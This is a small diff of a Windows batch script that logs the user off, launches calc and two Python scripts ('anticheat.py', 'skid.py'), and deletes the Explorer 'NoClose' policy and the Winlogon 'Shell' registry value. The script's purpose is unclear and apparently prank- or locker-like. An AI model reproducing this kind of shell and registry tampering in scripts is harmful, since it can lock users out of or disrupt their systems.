@@ -20,7 +20,7 @@ shutdown -l
 exit
 :init
 start calc
-python\pythonw anticheat.py
+start python\pythonw anticheat.py
 python\python skid.py
 reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /f
 reg delete "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
